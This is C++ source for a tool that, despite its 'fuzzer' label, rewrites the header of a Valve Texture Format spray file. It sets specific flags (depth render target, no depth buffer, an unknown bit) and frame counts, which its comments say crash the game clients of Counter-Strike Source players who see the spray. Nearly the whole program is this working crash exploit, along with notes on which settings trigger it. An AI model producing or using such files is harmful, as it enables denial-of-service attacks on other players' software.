#include <exception>
#include <fstream>
#include <string>
#include <iostream>
#include <memory>
#include <algorithm>
#include <vector>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <math.h>
#include <time.h>

/*
    vtf header fuzzer
    can cause crashes when players see sprays produced by this program
    https://github.com/destoer/vtf_fuzzer
*/


//https://developer.valvesoftware.com/wiki/Valve_Texture_Format
enum TextureFormat
{
	IMAGE_FORMAT_NONE = -1,
	IMAGE_FORMAT_RGBA8888 = 0,
	IMAGE_FORMAT_ABGR8888,
	IMAGE_FORMAT_RGB888,
	IMAGE_FORMAT_BGR888,
	IMAGE_FORMAT_RGB565,
	IMAGE_FORMAT_I8,
	IMAGE_FORMAT_IA88,
	IMAGE_FORMAT_P8,
	IMAGE_FORMAT_A8,
	IMAGE_FORMAT_RGB888_BLUESCREEN,
	IMAGE_FORMAT_BGR888_BLUESCREEN,
	IMAGE_FORMAT_ARGB8888,
	IMAGE_FORMAT_BGRA8888,
	IMAGE_FORMAT_DXT1,
	IMAGE_FORMAT_DXT3,
	IMAGE_FORMAT_DXT5,
	IMAGE_FORMAT_BGRX8888,
	IMAGE_FORMAT_BGR565,
	IMAGE_FORMAT_BGRX5551,
	IMAGE_FORMAT_BGRA4444,
	IMAGE_FORMAT_DXT1_ONEBITALPHA,
	IMAGE_FORMAT_BGRA5551,
	IMAGE_FORMAT_UV88,
	IMAGE_FORMAT_UVWQ8888,
	IMAGE_FORMAT_RGBA16161616F,
	IMAGE_FORMAT_RGBA16161616,
	IMAGE_FORMAT_UVLX8888
};



struct tagVTFHEADER
{
	char		signature[4];		// File signature ("VTF\0"). (or as little-endian integer, 0x00465456)
	unsigned int	version[2];		// version[0].version[1] (currently 7.2).
	unsigned int	headerSize;		// Size of the header struct  (16 byte aligned; currently 80 bytes) + size of the resources dictionary (7.3+).
	unsigned short	width;			// Width of the largest mipmap in pixels. Must be a power of 2.
	unsigned short	height;			// Height of the largest mipmap in pixels. Must be a power of 2.
	unsigned int	flags;			// VTF flags.
	unsigned short	frames;			// Number of frames, if animated (1 for no animation).
	unsigned short	firstFrame;		// First frame in animation (0 based).
	unsigned char	padding0[4];		// reflectivity padding (16 byte alignment).
	float		reflectivity[3];	// reflectivity vector.
	unsigned char	padding1[4];		// reflectivity padding (8 byte packing).
	float		bumpmapScale;		// Bumpmap scale.
	unsigned int	highResImageFormat;	// High resolution image format.
	unsigned char	mipmapCount;		// Number of mipmaps.
	unsigned int	lowResImageFormat;	// Low resolution image format (always DXT1).
	unsigned char	lowResImageWidth;	// Low resolution image width.
	unsigned char	lowResImageHeight;	// Low resolution image height.

	// 7.2+
	unsigned short	depth;			// Depth of the largest mipmap in pixels.
						            // Must be a power of 2. Is 1 for a 2D texture.
};

template<typename T>
void read_file(const std::string &filename, T *buf, size_t size)
{
    std::ifstream fp(filename,std::ios::binary);

    if(!fp)
    {
        auto err = "[read]failed to open file: " + filename;
        std::cout << err;
        exit(1);
    }

    fp.read(reinterpret_cast<char*>(buf),size);
    fp.close();
}


template<typename T>
void write_file(const std::string &filename, const T *data,size_t size)
{
    std::ofstream fp(filename,std::ios::binary);

    if(!fp)
    {
        auto err = "[write]failed to open file: " + filename;
        std::cout << err;
        exit(1);
    }
    
	fp.write(reinterpret_cast<const char*>(data),size);
    fp.close();
}

size_t get_file_size(const std::string &filename)
{
    std::ifstream fp(filename);

    if(!fp)
    {
        auto err = "[size]failed to open file: " + filename;
        std::cout << err;
        exit(1);        
    }

    fp.seekg(0,fp.end);
	auto size  = fp.tellg();
    fp.close();
    return size;
}


bool is_set(int flag, int bit)
{
    return (flag >> bit) & 1;
}

int set_bit(int flag,int bit) noexcept
{
    return flag | (1 << bit);
}

int deset_bit(int flag,int bit) noexcept
{
    return flag & ~(1 << bit);
}

template<typename T>
bool in_range(T v, T l, T h)
{
    return (v <= h && v >= l);
}

int main(int argc,char *argv[])
{
    if(argc != 3)
    {
        printf("usage: %s <vtf file to inspect> <output name>",argv[0]);
    }

    const std::string filename = argv[1];
    size_t file_size = get_file_size(filename);

    if(file_size < 0x50)
    {
        puts("file too small");
        exit(1);
    }

    auto in_buf = std::make_unique<uint8_t[]>(file_size);

    read_file(filename,&in_buf[0],file_size);

   

    const size_t header_size = sizeof(tagVTFHEADER);
    if(file_size < header_size || file_size < header_size)
    {
        puts("file too small");
        exit(1);
    }




    // pull however many fields out of the header we have
    tagVTFHEADER vtf_header;
    memset(&vtf_header,0,header_size);
    memcpy(&vtf_header,&in_buf[0],header_size);


    // print our header
    printf("file size: %zd\n",file_size);
    printf("Magic: %s\n",vtf_header.signature);
    printf("version %d.%d\n",vtf_header.version[0],vtf_header.version[1]);
    printf("header size %d\n",vtf_header.headerSize);
    printf("width %d\n",vtf_header.width);
    printf("height %d\n",vtf_header.height);
    printf("flags: %08x\n",vtf_header.flags);
    printf("frames %d\n",vtf_header.frames);
    printf("first frame %d\n",vtf_header.firstFrame);
    printf("reflectivity %f %f %f\n",vtf_header.reflectivity[0],vtf_header.reflectivity[1],vtf_header.reflectivity[2]);
    printf("bumpmapscale: %f\n",vtf_header.bumpmapScale);
    printf("highresimagefmt: %d\n",vtf_header.highResImageFormat);
    printf("mipmapcount %d\n",vtf_header.mipmapCount);
    printf("lowresimagefmt: %d\n",vtf_header.lowResImageFormat);
    printf("lowreswidth: %d\n",vtf_header.lowResImageWidth);
    printf("lowresheight: %d\n",vtf_header.lowResImageHeight);
    printf("depth: %d\n",vtf_header.depth);


    printf("point sampling: %d\n",is_set(vtf_header.flags,0));
    printf("trilinear sampling: %d\n",is_set(vtf_header.flags,1));
    printf("clamp s: %d\n",is_set(vtf_header.flags,2));
    printf("clamp t: %d\n",is_set(vtf_header.flags,3));
    printf("anisotropic sampling: %d\n",is_set(vtf_header.flags,4));
    printf("hint dxt5: %d\n",is_set(vtf_header.flags,5));
    printf("unknown: %d\n",is_set(vtf_header.flags,6));
    printf("normal map: %d\n",is_set(vtf_header.flags,7));
    printf("no mipmaps: %d\n",is_set(vtf_header.flags,8));
    printf("no level of detail: %d\n",is_set(vtf_header.flags,9));
    printf("no min mipmap: %d\n",is_set(vtf_header.flags,10));
    printf("procedural: %d\n",is_set(vtf_header.flags,11));
    printf("one bit alpha: %d\n",is_set(vtf_header.flags,12));
    printf("eight bit alpha: %d\n",is_set(vtf_header.flags,13));
    printf("env map: %d\n",is_set(vtf_header.flags,14));
    printf("render target: %d\n",is_set(vtf_header.flags,15));
    printf("depth render target: %d\n",is_set(vtf_header.flags,16));
    printf("no debug override: %d\n",is_set(vtf_header.flags,17));
    printf("single copy: %d\n",is_set(vtf_header.flags,18));
    printf("pre srgb: %d\n",is_set(vtf_header.flags,19));
    printf("premultiply color by one over mipmap level: %d\n",is_set(vtf_header.flags,20));
    printf("normal to dudv: %d\n",is_set(vtf_header.flags,21));
    printf("alpha test mipmap generation: %d\n",is_set(vtf_header.flags,22));
    printf("no depth buffer: %d\n",is_set(vtf_header.flags,23));
    printf("nice filtered: %d\n",is_set(vtf_header.flags,24));
    printf("clamp u: %d\n",is_set(vtf_header.flags,25));
    printf("vertex texture: %d\n",is_set(vtf_header.flags,26));
    printf("ssbump: %d\n",is_set(vtf_header.flags,27));
    printf("border: %d\n",is_set(vtf_header.flags,29));
    
    
    // a zerod out header will happily be loaded
    // even if the console complains about it a little 
    // on counter strike source
    // and will cause crashes

    printf("size of header: %x\n",header_size);
    
    // new header size + old file data
    static_assert(0x50 >= header_size);
    const size_t data_size = file_size-header_size;
    const size_t out_buf_size = header_size + data_size;
    auto out_buf = std::make_unique<uint8_t[]>(out_buf_size);
    memset(&out_buf[0],0,out_buf_size);

    // memcpy old header in
    tagVTFHEADER new_header;
    memset(&new_header,0,header_size);
    //memcpy(&new_header,&vtf_header,header_size);

    srand(time(NULL));

	// do some basic validity checks
    // standard header stuff
    new_header.version[0] = 7; new_header.version[1] = 1;
    new_header.headerSize = 0x40;
    strcpy(new_header.signature,"VTF");

    
/*
    // if this flag is set width and height must be equal
    // or it will complain about having a non sqaure cubemap
    if(is_set(new_header.flags,14))
    {
        new_header.width = new_header.height;
    }
*/


    // make this thing valid
    new_header.width = new_header.height = 512;
    new_header.depth = 1;
    new_header.frames = 10;

    //new_header.highResImageFormat = IMAGE_FORMAT_DXT5;
    //new_header.lowResImageFormat = IMAGE_FORMAT_DXT1;


    // what i think causes it is the depth target
	// it would appear a couple of frames are required too 
	// (1 wont work and zero will just cause it to read unitalized memory works on any spray)
	// spray i tested against has a dxt1 fmt (dont know if others work too)
    new_header.flags = set_bit(new_header.flags,16); // depth render target
    new_header.flags = set_bit(new_header.flags,23); // no depth buffer (this would seem to be in conflict with other settings!?)
    //new_header.flags = set_bit(new_header.flags,15); // render target


    // unknown
    new_header.flags = set_bit(new_header.flags,6);

    //new_header.mipmapCount = 8;
    //new_header.bumpmapScale = 1.0;




    for(int i = 0; i < 3; i++)
    {
        new_header.reflectivity[i] = (float)1 / ( rand() % 512 );
    }

    
    
    // copy header 
    memcpy(&out_buf[0],&new_header,header_size);
    memcpy(&out_buf[header_size],&in_buf[header_size],data_size);


    write_file(argv[2],&out_buf[0],out_buf_size);
    puts("wrote file!");    
}
